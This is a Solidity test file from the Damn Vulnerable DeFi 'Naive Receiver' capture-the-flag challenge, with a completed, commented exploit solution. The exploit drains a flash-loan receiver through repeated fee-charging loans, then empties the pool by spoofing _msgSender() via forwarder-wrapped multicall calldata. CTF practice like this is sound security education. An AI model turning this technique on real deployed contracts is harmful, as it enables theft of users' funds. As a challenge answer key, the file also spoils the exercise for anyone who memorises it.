// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // --- PART 1: Drain the FlashLoanReceiver ---
        // The FlashLoanReceiver doesn't check who initiated the flash loan.
        // It blindly pays the 1 WETH fee anytime `onFlashLoan` is called by the pool.
        // We pack 10 flash loan requests into an array to execute them in a single
        // transaction using the pool's `multicall` function. This drains its 10 WETH.
        bytes[] memory callData = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            callData[i] = abi.encodeCall(
                pool.flashLoan,
                (receiver, address(weth), 0, bytes(""))
            );
        }
        pool.multicall(callData);

        // --- PART 2: Drain the NaiveReceiverPool ---
        // The pool uses `_msgSender()` to determine whose balance to reduce during a `withdraw`.
        // If the call comes from the `trustedForwarder`, it trusts the last 20 bytes of `msg.data`
        // as the actual sender.
        // Because `pool` inherits `Multicall` (which uses `delegatecall`), if the forwarder 
        // calls `multicall`, the inner `delegatecall` preserves `msg.sender` as the forwarder, 
        // but `msg.data` becomes whatever we passed in the array. 
        // So, we can append the `deployer` address (who owns the deposits) to a `withdraw` call.
        bytes[] memory withdrawData = new bytes[](1);
        withdrawData[0] = abi.encodePacked(
            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            deployer // Append deployer address to spoof _msgSender()
        );
        
        // We wrap our crafted `withdraw` payload inside a `multicall` payload for the forwarder
        bytes memory multicallData = abi.encodeCall(pool.multicall, (withdrawData));

        // Create the EIP-712 meta-transaction request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: block.timestamp
        });

        // Generate the EIP-712 signature using the player's private key
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the meta-transaction via the forwarder
        bool success = forwarder.execute(request, signature);
        require(success, "Forwarder call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
